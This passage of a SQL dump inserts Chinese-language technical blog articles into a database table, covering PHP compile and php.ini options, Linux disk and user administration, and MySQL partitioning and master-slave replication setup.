class="brush:js;toolbar:false">get(&#39;story.json&#39;).then(function(response)&nbsp;{\r\n&nbsp;&nbsp;console.log(&quot;Success!&quot;,&nbsp;response);\r\n},&nbsp;function(error)&nbsp;{\r\n&nbsp;&nbsp;console.error(&quot;Failed!&quot;,&nbsp;error);\r\n});</pre><p>在浏览器开发工具的控制台中查看执行结果。<br/></p><p>现在，我们可以不通过手动输入XMLHttpRequest来创建HTTP请求了，非常好，因为如果我越少看到XMLHttpRequest的话，我就会越开心的。<br/></p><h3>链</h3><p>then并不是结束，你可以在它的后面链接其他的then以实现一个接一个的运行额外的异步动作和传递值。<br/></p><p><br/></p><p>未完待续...</p><p><br/></p><p>[原文： http://www.html5rocks.com/en/tutorials/es6/promises/]</p>', '本文是javascript promises翻译的第二部分，由于文章比较长，所以分多次进行阅读。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/b8a775a528ba48002ecf2817098d1f7d.png', 'mylxsw', '翻译', 1, 0, 1400255683, NULL, NULL, 'html'),
(353, 'PHP编译核心配置选项', '下面这些配置选项是在类unix系统中编译php的时候，使用 ```configure``` 脚本编译配置php的时候的部分配置项列表。   \r\n这里只是列出部分，大部分其他配置选项都在他们的扩展引用页列出，要查看完整的配置选项列表，可以在运行 ```autoconf``` （在安装部分介绍）之后，在php源文件目录中运行 ```./configure --help``` 。你可能也对额外的选项如 ```--prefix=PREFIX``` 感兴趣，可以在[GNU configure](http://www.airs.com/ian/configure/)文档中查看相关信息。   \r\n\r\n> 注意：这些选项只在编译时有用。如果你希望修改php的运行时配置，请查看[运行时配置](#)章节。   \r\n\r\n###PHP中的配置选项\r\n> 注意： 这些选项只在php4.1.0之后有用，尽管部分在之前的版本中也是有用的，但是，如果你想使用之前版本的话，这里的部分选项可能是没有作用的。\r\n\r\n####选项大杂烩\r\n\r\n* **--enable-debug**   \r\n开启debug模式\r\n* **--with-layout=TYPE**   \r\n设置被安装的文件将会被怎么安排，这里的TYPE是PHP（默认）或者GNU。\r\n* **--with-pear=DIR**   \r\n安装pear到dir中（默认是PREFIX/lib/php)\r\n* **--without-pear**   \r\n不安装pear\r\n* **--enable-sigchild**   \r\n允许php自己的SIGCHILD处理器\r\n* **--disable-rpath**   \r\n禁止传递额外的运行时类库搜索路径\r\n* **--enable-libgcc**   \r\n对libgcc使用显式链接\r\n* **--enable-php-streams**   \r\n包含实验性的php流，除非你测试过这些代码，否则请不要使用\r\n* **--with-zlib-dir[=DIR]**   \r\n定义zlib的安装目录位置\r\n* **--enable-trans-sid**   \r\n允许透明的session id传播，只在php4.1.2之前有用，从php4.2.0之后，trans-id特性总是被编译到核心中。\r\n* **--with-tsrm-pthreads**   \r\n使用POSIX线程（默认）\r\n* **--enable-shared[=PKGS]**   \r\n构建共享库，默认是yes\r\n* **--enable-static[=PKGS]**   \r\n构建静态库，默认是yes\r\n* **--enable-fast-install[=PKGS]**   \r\n快速安装优化， 默认是yes\r\n* **--with-gnu-ld**   \r\n假设GNU编译器使用gnu ld，默认是no\r\n* **--disable-libtool-lock**   \r\n避免锁定（可能会打断并行构建）\r\n* **--with-pic**   \r\n尝试只使用PIC/non-PIC对象（默认值=use both）\r\n* **--enable-memory-limit**   \r\n使用内存限制支持编译（从php5.2.1之后不再支持该选项，默认总是enabled的）\r\n* **--disable-url-fopen-wrapper**   \r\n禁止url感知，该功能允许通过http或者ftp访问文件。（php5.2.5之后不再可用）\r\n* **--enable-versioning**   \r\n导出必须的符号，具体查看INSTALL。\r\n\r\n####PHP选项\r\n* **--enable-maintainer-mode**   \r\n允许对非正式的安装器使规则和依赖无用。\r\n* **--with-config-file-path=PATH**   \r\n设置 ```php.ini``` 的目录，默认是 ```PREFIX/lib```\r\n* **--enable-safe-mode**   \r\n默认允许安全模式\r\n> 警告： 这个特性在php5.3中已经不推荐使用了，在php5.4中已经移除。   \r\n\r\n* **--with-exec-dir[=DIR]**   \r\n在安全模式下，只允许在DIR中可执行。默认是/usr/local/php/bin\r\n> 警告： 这个特性在php5.3中已经不推荐使用了，在php5.4中已经移除。   \r\n\r\n* **--enable-magic-quotes**   \r\n默认允许魔术引号。\r\n> 警告： 这个特性在php5.3中已经不推荐使用了，在php5.4中已经移除。   \r\n\r\n* **--disable-short-tags**   \r\n默认禁止短标记<?\r\n* **--enable-zend-multibyte**   \r\n允许在语言解释器和扫描器中使用多字节代码，当php使用这个选项编译时，同时也会允许在declare构造器中的encoding指令。\r\n> 警告： 这个特性在php5.3中已经不推荐使用了，在php5.4中已经移除。   \r\n\r\n* **--with-libdir**   \r\n指定在类unix系统中编译php所需要的类库所在的路径。对于64位系统而言，需要指定该参数为lib64的目录： ```--with-libdir=lib64``` \r\n\r\n####SAPI选项\r\n下面这些选项列出了对php可用的SAPI选项。   \r\n\r\n* **--with-aolserver=DIR**   \r\n指定安装的AOLserver路径   \r\n* **--with-apxs[=FILE]**   \r\n构建共享的Apache模块。FILE是Apache apxs tool的路径名，默认是apxs。需要注意的是，一定要确定你指定的apxs版本与你系统中实际安装的版本是相同的，并且不是在apache源码的包中的。   \r\n* **--with-apache[=DIR]**   \r\n构建一个静态的Apache模块。DIR是Apache构建目录的顶级目录，默认是/usr/local/apache   \r\n* **--with-mod_charset**   \r\n允许为mod_charset(Russian Apache)使用转换表   \r\n* **--with-apxs2[=FILE]**   \r\n构建共享的Apache2.0模块，FILE是Apache apxs tool的路径名，默认是apxs。   \r\n* **--with-caudium=DIR**   \r\n将php构建为一个pike模块，以便与Caudium一起使用，DIR是Caudium服务器的目录， 默认值是/usr/local/caudium/server.\r\n* **--disable-cli**   \r\n在PHP4.3.0中可用，禁止构建CLI版本的PHP（强制--without-pear)。\r\n* **-enable-embed[=TYPE]**   \r\n允许构建嵌入式的SAPI类库。TYPE是shared和static之一，默认是shared，从php4.3.0之后可用。\r\n* **--with-fhttpd[=DIR]**   \r\n略\r\n* **--with-isapi=DIR**   \r\n略\r\n* **--with-nsapi=DIR**   \r\n略\r\n* **--with-phttpd=DIR**   \r\n略\r\n* **--with-fastcgi**   \r\n构建php作为FastCGI应用。从php4.3.0之后就不可用了，使用 ```--enable-fastcgi``` 代替\r\n* **--enable-fastcgi**   \r\n如果允许的话，CGI模块将会以支持FastCGI的模式构建，从php4.3.0之后可用\r\n* **--disable-path-info-check**   \r\n如果禁止的话，路径诸如 ```/info.php/test?a=b``` 将不会工作，从php4.3.0之后可用。\r\n\r\n> 注意：```--prefix``` 和 ```--exec-prefix``` 是GNU配置构建系统通用的配置项，其中 ```--prefix``` 指定了文件安装的位置，默认值是 ```/usr/local``` , 而 ```--exec-prefix``` 则是程序的可执行文件安装位置，一般位于 ```--prefix``` 指定的子目录下，默认值与 ```--prefix``` 相同。', '下面这些配置选项是在类unix系统中编译php的时候，使用configure脚本编译配置php的时候的部分配置项列表。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/aa29571ccac80268a197bce2b1ffbd34.jpg', 'mylxsw', '翻译', 1, 0, 1400428358, 1400509589, 0, 'markdown');
INSERT INTO `ar_article` (`id`, `title`, `content`, `intro`, `feature_img`, `author`, `source`, `isvalid`, `creator`, `publish_date`, `update_date`, `updator`, `model`) VALUES
(354, 'PHP配置文件php.ini常用配置说明', '本文记录了php.ini中比较常用的配置项及其含义，以便参阅以修改php的行为。 文中各个配置项的说明来自对php官方文档的翻译，水平有限，敬请谅解。   \r\n\r\n- **short_open_tag**   \r\n是否支持短标记，在php5.4之前，该选项是off的，在php5.4之后，默认是on\r\n- **asp_tags**   \r\n是否允许使用ASP样式的语法，如&lt;% %&gt;\r\n- **precision**   \r\n浮点型数字显示的位数（精度）\r\n- **serialize_precision**   \r\n浮点型数字在序列化是保存的位数（精度）\r\n- **expose_php**   \r\n是否对外界曝露服务器上安装的是php，包含在HTTP的header中加入php的版本号（例如：X-Powered-By: PHP/5.3.7）。在php5.5.0之前，php的logo也总是曝露的，因此，如果在你的url后面加上guid将会显示一个logo（例如：[http://www.php.net/?=PHPE9568F34-D428-11d2-A769-00AA001ACF42](http://www.php.net/?=PHPE9568F34-D428-11d2-A769-00AA001ACF42)），同样，这也影响了 ```phpinfo()``` 的输出，如果禁止的话，php的logo和附加信息将不会被显示。   \r\n> 从php5.5.0开始，这个输出logo的标示和 ```php_logo_guid()```函数已经从php中移除，因此如果在url后面加上guid的话，将不会再显示php的logo。如果将expose_php设置为off是不会影响 ```phpinfo()``` 函数中php的logo显示的。   \r\n\r\n- **disable_functions**   \r\n这个指令允许你因为安全考虑而禁止部分php函数，它接受一个以英文逗号分割的函数名列表，该指令不受安全模式影响。   \r\n只有内部函数可以通过这个指令禁止，用户自定义的函数是不受影响的。   \r\n这个指令必须在php.ini中设置，例如，你不能在 httpd.conf中进行设置。\r\n- **disable_class**   \r\n这个指令允许你因为安全考虑而禁用部分php类，它接受一个以英文逗号分隔的类名列表，该指令也不受安全模式影响，必须在php.ini中进行配置\r\n- **zend.multibyte**   \r\n允许解析源码中的多字节编码字符\r\n- **detect_unicode**   \r\n检查BOM(字节顺序标记)并且查看是否文件包含可用的多字节字符。这个检测过程在处理 ```__halt_compiler()``` 之前执行，只有在Zend Multibyte 模式下可用\r\n- **exit_on_timeout**   \r\n这个指令是Apache1的mod_php专用的，用于强制Apache子进程在php脚本执行超时的时候退出。这个超时在Apache1内部造成了一个 ```loggjmp()``` 调用，可能会造成一些扩展的状态不一致。通过终止进程，使得任何为解决的锁或者是内存都会被清理掉。\r\n- **memory_limit**    \r\n默认值是128M，在PHP5.2.0之前是8M， 在5.2.0中是16M。   \r\n这个配置项设置了允许给php脚本执行分配的最大内存，这有助于防止脚本耗尽服务器全部内存。注意的是，如果需要设置为不限制内存，将该值设置为 ```-1``` .   \r\n在PHP5.2.1之前，如果要使用该指令的话，必须在编译php的时候，在configure中指定 ```--enable-memeory-limit``` ， 这个编译时的标记也是函数 ```memory_get_usage()``` 和 ```memory_get_peak_usage()``` 所依赖的（在php5.2.1之前）。   \r\n如果使用整数值的话，这个值将会以byte为单位。 \r\n－ **register_global**   \r\n是否将EGPCS（Env，GET，POST，Cookie，Server）注册为全局变量。   \r\n在PHP4.2.0之后，该选项默认时off。   \r\n需要注意的时，该项不能在运行时设置（ini_set），但是你可以通过 ```.htaccess``` 进行设置，例如 ```php_flag register_globals off```.   \r\n> 注意： 这个特性在PHP5.3.0已经不推荐使用，并且在PHP5.4.0之后移除了。\r\n\r\n- **enable_post_data_reading**   \r\n禁止这个选项将会使 ```$_POST``` 和 ```$_FILES``` 不会被填充，唯一能够访问post数据的方法是通过 ```php://input``` 流包装器。这在代理请求或者是在内存中更高效处理post数据的时候是非常有用的。\r\n- **post_max_size**   \r\n设置最大允许的post数据大小。这个设置也影响这文件上传。要上传一个大的文件的话，这个值必须大于 ```upload_max_filesize``` 指令。如果你的脚本允许内存限制了， ```memory_limit``` 指令也会影响文件上传。简单来说，```memory_limit``` 应该大于 ```post_max_size```. 当使用整数的时候，单位是byte。如果post的数据比 ```post_max_size``` 要大的话，$_POST和$_FILES将会是空的。可以通过多种方法跟踪这个问题，例如，通过处理数据的脚本传递一个$_GET变量，```<form action="edit.php?processed=1" >``` ,然后检查$_GET[''processed'']是否被设置了。\r\n- **auto_prefend_file**   \r\n指定了在主文件执行之前自动解析的文件，这个就像通过require函数包含一样，因此，会使用include_path。如果指定为none则禁止自动前缀追加文件。\r\n- **auto_append_file**   \r\n指定了在主文件执行之后自动解析的文件，与 ```auto_prefend_file``` 类似。如果指定为none则禁止该功能。   \r\n> 注意： 如果脚本中使用exit()终止了，则auto-append将不会发生。\r\n\r\n- **always_populate_raw_post_data**   \r\n总是填充$HTTP_RAW_POST_DATA以包含POST数据，否则，这个变量将会仅仅被填充无法识别的MIIME数据类型。然而，访问原始POST数据的最佳方法是通过 ```php://input```,$HTTP_RAW_POST_DATA在 ```enctype="multipart/form-data"``` 的情况下是不可用的。\r\n- **include_path**   \r\n指定了 ```require``` , ```include``` , ```fopen()``` , ```file()``` , ```readfile()``` 和 ```file_get_contents()``` 查询文件的路径。格式与操作系统的PATH环境变量是一致的。   \r\n你可以在运行时使用 ```set_include_path()``` 修改include路径。   \r\n例如＃1 UNIX系统下\r\n<pre>include_path=".:/php/includes"</pre>\r\n＃2 Windows下\r\n<pre>include_path=".;c:\\php\\includes"</pre>\r\n- **open_basedir**   \r\n限制php只能够访问指定目录树下的文件，包含文件本身，这个命令不受安全模式影响。   \r\n当一个脚本试图访问文件系统的时候，例如使用 ```include``` 或者 ```fopen()``` ，会检查文件的位置是否被允许，当被访问的文件在指定的目录之外的时候，php将会拒绝对该文件的访问。所有的符号链接也会被解析，因此，通过符号链接也是无法绕过该限制的。如果文件不存在的话，符号链接将无法被解析，同时将会用文件名与open_basedir进行比较。   \r\n```open_basedir``` 不仅可以影响文件系统函数，例如，如果mysql配置使用mysqlnd驱动的话，LOAD DATA INFILE将会受到open_basedir的影响。   \r\n特殊的值```.``` 代表了脚本所在的目录就是base－directroy，但是需要注意的是，脚本的工作目录可以通过 ```chdir()``` 进行修改，这是非常危险的。   \r\n指令 ```open_basedir``` 对目录的限制是从php5.2.16和php5.3.4开始的，在之前的版本中，他会使用前缀进行匹配，也就是说，如果```open_basedir=/dir/incl```， 这将会允许对 ```/dir/include``` 和```/dir/incls``` 的访问。当你希望限制在某个目录下的时候，在后面加一个```/```。例如: ```open_basedir=/dir/incl/```.   \r\n默认情况下是允许对所有目录进行访问的。   \r\n> 注意： 从php5.3.0开始，该指令是可以在运行时指定的，这意味这，如果在php.ini中设置该指令为/www/的话，脚本执行过程中可以使用```ini_set()```修改配置为```/www/tmp/```.当列出多个目录的时候，你可以使用PATH_SEPARATOR常量作为分隔符。\r\n\r\n- **extension_dir**  \r\nphp动态载入扩展的目录。\r\n- **extension**   \r\n当php启动的时候自动载入哪些扩展。 \r\n- **file_uploads**   \r\n是否允许HTTP文件上传，相关指令有```upload_max_size```, ```upload_tmp_dir```, ```post_max_size```.\r\n- **upload_tmp_dir**   \r\n用于存储使用文件上传功能上传的文件的临时目录，这个目录必须对运行php的用户是可写的，如果没有指定的话，php将会使用系统默认的。   \r\n如果这里指定的目录对php不可写，php将会使用系统的默认临时目录，如果```open_basedir```指令开启，系统默认的临时文件目录必须是被允许的才能上传成功。\r\n- **upload_max_filesize**  \r\n上传文件最大的尺寸，当使用整数值的时候，单位是byte。\r\n- **max_file_uploads**   \r\n同时允许上传的总文件上数量，从php5.3.4开始，在执行提交的时候如果上传文件字段为空的话不会记录到该限制的数量中。\r\n\r\n   ［持续整理...］ ', '本文记录了php.ini中比较常用的配置项及其含义，以便参阅以修改php的行为。 文中各个配置项的说明来自对php官方文档的翻译，水平有限，敬请谅解。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/f622d839e480f17567cef2a5ff5f8a73.jpg', 'mylxsw', '原创', 1, 0, 1400514742, 1400600694, 0, 'markdown'),
(355, 'Linux学习笔记', '###1. 磁盘管理\r\n#####1.1 查看磁盘分区信息(修改分区)\r\n方法1: 查看 ```/proc/partitions``` 文件   \r\n<pre>\r\n[root@localhost TestLabs]# cat /proc/partitions \r\nmajor minor  #blocks  name\r\n\r\n   8        0   67108864 sda\r\n   8        1     512000 sda1\r\n   8        2   66595840 sda2\r\n 253        0   31985664 dm-0\r\n 253        1    2064384 dm-1\r\n 253        2   32542720 dm-2\r\n</pre>\r\n方法2: 执行命令 ```fdisk -l```\r\n<pre>\r\n[root@localhost TestLabs]# fdisk -l\r\n\r\nDisk /dev/sda: 68.7 GB, 68719476736 bytes\r\n255 heads, 63 sectors/track, 8354 cylinders\r\nUnits = cylinders of 16065 * 512 = 8225280 bytes\r\nSector size (logical/physical): 512 bytes / 4096 bytes\r\nI/O size (minimum/optimal): 4096 bytes / 4096 bytes\r\nDisk identifier: 0x00043e44\r\n\r\n   Device Boot      Start         End      Blocks   Id  System\r\n/dev/sda1   *           1          64      512000   83  Linux\r\nPartition 1 does not end on cylinder boundary.\r\n/dev/sda2              64        8355    66595840   8e  Linux LVM\r\n</pre>\r\n> 修改分区可以使用 ```fdisk [分区名称]``` 进入交互界面进行磁盘分区管理。如下图所示： \r\n\r\n<pre>\r\n[root@localhost TestLabs]# fdisk /dev/sda\r\n\r\nThe device presents a logical sector size that is smaller than\r\nthe physical sector size. Aligning to a physical sector (or optimal\r\nI/O) size boundary is recommended, or performance may be impacted.\r\n\r\nWARNING: DOS-compatible mode is deprecated. It''s strongly recommended to\r\n         switch off the mode (command ''c'') and change display units to\r\n         sectors (command ''u'').\r\n\r\nCommand (m for help): m\r\nCommand action\r\n   a   toggle a bootable flag\r\n   b   edit bsd disklabel\r\n   c   toggle the dos compatibility flag\r\n   d   delete a partition\r\n   l   list known partition types\r\n   m   print this menu\r\n   n   add a new partition\r\n   o   create a new empty DOS partition table\r\n   p   print the partition table\r\n   q   quit without saving changes\r\n   s   create a new empty Sun disklabel\r\n   t   change a partition''s system id\r\n   u   change display/entry units\r\n   v   verify the partition table\r\n   w   write table to disk and exit\r\n   x   extra functionality (experts only)\r\n\r\nCommand (m for help): \r\n</pre>\r\n\r\n#####1.2 创建文件系统\r\n使用命令 ```mke2fs -t [要创建的文件系统类型] [磁盘]```   \r\n<pre>\r\n[root@localhost TestLabs]# mke2fs -t ext4 /dev/sda3\r\n</pre>\r\n\r\n常用参数\r\n\r\n- -b blocksize 指定文件系统块大小    \r\n- -c 	创建的时候检查坏块   \r\n- -L	指定卷标   \r\n- -j 	建立文件系统日志\r\n\r\n####1.3 磁盘挂载\r\n挂载磁盘，使用```mount [要挂载的分区] [挂在点]```命令。    \r\n直接使用mount命令将会列出已经挂载的分区。    \r\n常用参数：   \r\n\r\n- **-t** 指定文件系统的类型\r\n- **-o** 指定挂载选项（ro[只读],rw[读写],sync[无缓存，直写],async[缓存，默认],noatime[每次访问不更新文件访问时间],atime[每次访问更新文件访问时间],remount[重新挂载]）\r\n\r\n<pre>\r\n#mount -o remount,sync,noatime /dev/sdb1 /mnt/\r\n</pre>\r\n\r\n使用命令 ```umount [文件系统／挂载点]``` 卸载已经挂载的文件系统。\r\n\r\n\r\n> 使用命令 ```lsof``` 查看打开了那些文件，一般可以在无法卸载磁盘的时候用于查看已经打开的文件，后面跟上磁盘，可以列出该磁盘上哪些文件打开了。   \r\n> 或者 如果无法卸载，提示文件正在被使用，可以使用```fuser -m /mnt``` 查看文件系统的进程。\r\n\r\n如果要实现自动挂载，可以修改 ```/etc/fstab```文件实现。该文件中新增一条记录就可以了，文件行结构如下所示：\r\n<table>\r\n<tr>\r\n	<td>/dev/sda3</td>\r\n	<td>/mnt</td>\r\n	<td>ext4</td>\r\n	<td>defaults</td>\r\n	<td>0 0</td>\r\n</tr>\r\n<tr>\r\n	<td>需要挂载的设备</td>\r\n	<td>挂载点</td>\r\n	<td>文件系统</td>\r\n	<td>挂载选项</td>\r\n	<td>dump，fsck相关选项</td>\r\n</tr>\r\n</table>\r\n\r\n> 使用```mount -a``` 会挂载fstab文件中的所有自动挂载项\r\n\r\n### 2. 用户及权限基础\r\n\r\n####2.1 用户基础\r\n用户分为三类：   \r\n\r\n- root用户，id为0的用户\r\n- 系统用户，没有shell（/sbin/nologin or /bin/false），id范围为1-499\r\n- 普通用户，id为500+\r\n\r\n> 使用```id```可以查看当前用户的信息\r\n\r\n用户配置文件为```/etc/passwd```,该文件保存了所有用户的基本信息，该文件所有用户均可以访问，因此，密码并不在该文件中存放，用户的密码存放在```/etc/shadow```文件中，该文件只有root用户可以访问。   \r\n另一个配置文件 ```/etc/group``` 为用户组的配置文件，包含了组的信息。   \r\n\r\n> 查看当前用户```whoami```,  ```who```, ```w``` , 命令越长，显示的内容越少。\r\n\r\n<pre>\r\nlocalhost:bash mylxsw$ whoami\r\nmylxsw\r\nlocalhost:bash mylxsw$ who\r\nmylxsw   console  May 27 20:50 \r\nmylxsw   ttys000  May 28 21:39 \r\nlocalhost:bash mylxsw$ w\r\n22:20  up 1 day,  1:31, 2 users, load averages: 2.22 1.82 1.68\r\nUSER     TTY      FROM              LOGIN@  IDLE WHAT\r\nmylxsw   console  -                二20   25:29 -\r\nmylxsw   s000     -                21:39       - w\r\n</pre>\r\n\r\n##### 2.1.1 添加新用户\r\n添加新用户使用命令```useradd```，如下\r\n<pre>\r\n[root@localhost mylxsw]# useradd aicode\r\n[root@localhost mylxsw]# cat /etc/passwd\r\nroot:x:0:0:管宜尧:/root:/bin/bash\r\n...\r\nmylxsw:x:500:500::/home/mylxsw:/bin/bash\r\naicode:x:501:501::/home/aicode:/bin/bash\r\n</pre>\r\n\r\n以上命令执行后会添加一个新用户，用户名为aicode，可以看到，该命令在/etc/passwd中添加了一条用户信息记录。\r\n\r\n> 该命令会为用户创建一个home目录，在/home/用户名，还会为用户建立一个用户组，改组名与用户名称相同，同时，会把```/etc/skel```目录下的文件复制到用户目录中。（/etc/skel目录为用户初始化目录，如果需在新建用户时初始化一些用户信息，可以在该目录中修改，类似于模板）\r\n\r\n\r\n常用参数:   \r\n\r\n- **-d**指定用户home目录\r\n- **-s**用户登陆shell\r\n- **-u**指定用户id\r\n- **-g**指定用户的主组\r\n- **-G**指定用户的附属组（最多31个，用“,”分隔）\r\n\r\n##### 2.1.2 修改用户信息\r\n通过命令```usermod [参数] [用户名]``` 修改用户信息。\r\n\r\n常用参数：\r\n\r\n- **-l**新的用户id\r\n- **-d**指定用户home目录\r\n- **-s**用户登陆shell\r\n- **-u**指定用户id\r\n- **-g**指定用户的主组\r\n- **-G**指定用户的附属组（最多31个，用“,”分隔）\r\n- **-L**锁定用户，使其不能登陆\r\n- **-U**解除对用户的锁定\r\n\r\n##### 2.1.3 删除用户\r\n使用命令```userdel [用户名]```删除用户。\r\n> 删除用户操作不会删除用户的home目录，如果要删除home目录，需要增加```-r```参数。\r\n\r\n##### 2.1.4 组的创建、修改、删除\r\n\r\n创建组 ```groupadd [组名]```   \r\n修改组名 ```groupmod -n [新组名] [旧组名]```   \r\n修改组id ```groupmod -g [新组id] [旧组id]```   \r\n删除组 ```groupdel [组名]```   \r\n', '学习Linux过程中的一些笔记，不断更新中。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/835e93c8337006eaf4c6fedd346fd5ef.jpg', 'mylxsw', '原创', 1, 0, 1401250869, 1413943873, 0, 'markdown'),
(356, 'MySQL笔记', '####1 分区相关####\r\nMySQL5.6中，分区技术只支持```水平分区```，而不支持```垂直分区```，分区支持大部分的存储引擎，但是MERGE, CSV, FEDERATED存储引擎不支持。\r\n\r\n使用```KEY```或者```LINEAR KEY```进行分区是支持NDB（网络数据库）的，但是其他分区方式不支持。\r\n\r\n在MySQL中查看是否是支持分区技术，使用命令 ```SHOW PLUGINS``` 进行查看，如果存在名称为 ```partition``` 的插件，状态为 ```ACTIVE``` 则说明分区技术可用。\r\n\r\n> MySQL5.6支持显式的分区查询，如 ```SELECT * FROM T PARTITION(p0, p1) WHERE c < 5```，可以只从p0,p1分区进行查询\r\n\r\n\r\n支持的分区类型：\r\n\r\n- **RANGE** 根据给定列的值的范围进行分区。\r\n- **LIST** 与RANGE类似，不过它通过判断给定列的值是否在独立的值的集合中进行分区。\r\n- **HASH** 这种分区根据对列进行操作的自定义表达式的值进行分区。这个自定义的函数可以包含任何可用的MySQL表达式，但是需要产生一个非负的值，扩展类型有```LINEAR HASH```.\r\n- **KEY** 这种分区方式与HASH类似，区别是只需要提供一列或者多列的值，通过MySQL自己的哈希函数进行计算，扩展类型有```LINEAR KEY```.\r\n\r\n> 常用的分区方式可以通过```日期```， ```时间``` 进行分区。当使用```KEY```或者```LINEAR KEY``` 方式进行分区的时候，可以直接使用```TIME```, ```DATETIME```, ```DATE```作为分区列而不需要执行任何的修改（常用时间函数：```TO_DAYS()```, ```YEAR```, ```TO_SECONDS```, ```WEEKDAY()```,```MONTH```等）。\r\n\r\n####2 主从相关####\r\n主库和从库都需要配置一个唯一的ID（```server-id```)， 每一个从库都必须配置主库的host名， 日志文件名和配置文件中的位置。\r\n\r\n#####2.1 配置Master#####\r\n修改 ```my.cnf``` 或者 ```my.ini``` 文件，在```[mysqld]```部分，增加（去掉注释）下列选项：\r\n<pre>\r\n[mysqld]\r\nlog-bin=mysql-bin\r\nserver-id=1\r\n</pre>\r\n修改后，重启mysql服务\r\n\r\n> 如果没有设置```server-id```或者是设置其为```默认值 0```，master将会拒绝所有slave的连接请求。\r\n\r\n> 使用```InnoDB```的事务在进行复制的时候，应该设置```innodb_flush_log_at_trx_commit=1```和```sync_binlog=1```以获取最佳的稳定性。\r\n\r\n> 确保 ```skip-networking```选项是禁止的，否则如果网络被禁止了，从库将无法与主库进行交流。\r\n\r\n主库中需要为从库创建连接用户，主库上的任何具有```REPLICATION SLAVE```权限的用户都可以作为从库的连接用户。\r\n<pre>\r\nmysql&gt; CREATE USER ''repl''@''%.mydomain.com'' IDENTIFIED BY ''slavepass'';\r\nmysql&gt; GRANT REPLICATION SLAVE ON *.* TO ''repl''@''%.mydomain.com'';\r\n</pre>\r\n\r\n如果在主库上已经存在数据了，在与从库进行同步之前，必须先停止主库上的处理进程，然后获取当前二进制日志文件的坐标并dump它的数据。   \r\n下面的步骤用于获取主库的二进制日志的坐标：\r\n	\r\n1. 使用命令行控制台连接到主库上，执行如下命令：\r\n	<pre>mysql> FLUSH TABLES WITH READ LOCK;</pre>\r\n	> 使用 ```UNLOCK TABLES``` 释放锁\r\n2. 使用另一个到主库的会话，使用```SHOW MASTER STATUS```查看当前的二进制日志文件名和位置.\r\n	<pre>\r\n	mysql &gt; SHOW MASTER STATUS;\r\n	+------------------+----------+--------------+------------------+\r\n	| File             | Position | Binlog_Do_DB | Binlog_Ignore_DB |\r\n	+------------------+----------+--------------+------------------+\r\n	| mysql-bin.000003 | 73       | test         | manual,mysql     |\r\n	+------------------+----------+--------------+------------------+\r\n	</pre>\r\n\r\n> 如果在启用log-bin之前，主库已经运行一段时间了，则使用```SHOW MASTER STATUS```命令查看到的日志文件名和位置将会是空的，在这种情况下，在从库中指定日志文件和位置分别为```''''```和```4```.\r\n\r\n如果在进行从库同步复制之前，主库中已经存在数据了，请保持读锁，使用下面的方法将主库的数据复制到从库中。    \r\n使用```mysqldump```创建要复制的所有数据库的一个快照，然后导入到从库中。\r\n<pre>\r\n# mysqldump -uroot --lock-all-tables --events --all-databases --master-data > dbdump.db\r\n</pre>\r\n\r\n> 导入dbdump.db文件，使用命令```shell> mysql < dbdump.db```\r\n\r\n\r\n#####2.2 配置slave#####\r\n修改配置文件\r\n<pre>\r\n[mysqld]\r\nserver-id=2\r\n</pre>\r\n\r\n在从库中，为了进行复制过程，并不需要启用log-bin。但如果在从库中启用log-bin的话，你可以在从库上进行二进制日志备份和崩溃后的恢复，或者将从库作为一个复杂的复制拓扑网络的一部分（例如，从库作为一个其它从库的主库）。\r\n\r\n建立从库到主库的连接：\r\n<pre>\r\nmysql&gt; CHANGE MASTER TO\r\n    -&gt;     MASTER_HOST=''master_host_name'',\r\n    -&gt;     MASTER_USER=''replication_user_name'',\r\n    -&gt;     MASTER_PASSWORD=''replication_password'',\r\n    -&gt;     MASTER_LOG_FILE=''recorded_log_file_name'',\r\n    -&gt;     MASTER_LOG_POS=recorded_log_position;\r\n</pre>\r\n例如：\r\n<pre>\r\nmysql&gt; change master to master_host=''10.58.91.4'', master_user=''repl'', master_password=''888888'',master_log_file=''mysql-bin.000002'', master_log_pos=385;\r\n</pre>\r\n> 注意： 复制不能使用UNIX socket文件，只能使用TCP/IP连接主库。\r\n\r\n启动从库\r\n<pre>mysql&gt; start slave;</pre>\r\n\r\n> 如果出现无法连接的问题，请检查是否服务器iptables对端口有限制\r\n\r\n\r\n####3 常用命令####\r\n授权任意主机以```root```方式访问\r\n<pre>\r\nmysql&gt; GRANT ALL PRIVILEGES ON *.* TO ''root''@''%'' WITH GRANT OPTION\r\n</pre>\r\n\r\n查看server-id\r\n<pre>\r\nmysql> show variables like ''server_id'';\r\n+---------------+-------+\r\n| Variable_name | Value |\r\n+---------------+-------+\r\n| server_id     | 0     |\r\n+---------------+-------+\r\n1 row in set (0.01 sec)\r\n</pre>', 'MySQL5.6中，分区技术只支持水平分区，而不支持垂直分区，分区支持大部分的存储引擎，但是MERGE, CSV, FEDERATED存储引擎不支持.', 'http://agiledev-arsenals.stor.sinaapp.com/cover/296ea29cffcf951edd3f1b24ce7ab7ae.jpg', 'mylxsw', '原创', 1, 0, 1402656046, 1413943889, 0, 'markdown'),
(357, 'Why MySQL says the server is not configured as a slave', '<p style="box-sizing: border-box; margin-top: 0px; margin-bottom: 20px; color: rgb(44, 62, 80); font-family: &#39;Open Sans&#39;, sans-serif; line-height: 27px; white-space: normal; background-color: rgb(254, 255, 255);">Is MySQL giving you the error message “ERROR 1200 (HY000): The server is not configured as slave; fix in config file or with CHANGE MASTER TO” when you try to run START SLAVE? There are a few simple troubleshooting steps to take, but I always forget what to do. This article is to help me remember in the future!</p><ul style="box-sizing: border-box; margin-bottom: 10px; color: rgb(44, 62, 80); font-family: &#39;Open Sans&#39;, sans-serif; line-height: 27px; white-space: normal; background-color: rgb(254, 255, 255);" class=" list-paddingleft-2"><li><p>First, make sure you have run&nbsp;<a href="http://dev.mysql.com/doc/en/change-master-to.html" style="box-sizing: border-box; color: rgb(91, 98, 104);">CHANGE MASTER TO</a>&nbsp;and configured the server as a slave. If you’ve done this, you should get some output from&nbsp;<a href="http://dev.mysql.com/doc/en/show-slave-status.html" style="box-sizing: border-box; color: rgb(91, 98, 104);">SHOW SLAVE STATUS</a>. If so, go to the next step.</p></li><li><p>Next, make sure you have set a server ID on both the master and the slave. Try running&nbsp;<code style="box-sizing: border-box; font-family: Monaco, Menlo, Consolas, &#39;Courier New&#39;, monospace; font-size: 14px; padding: 2px 4px; color: rgb(199, 37, 78); white-space: nowrap; 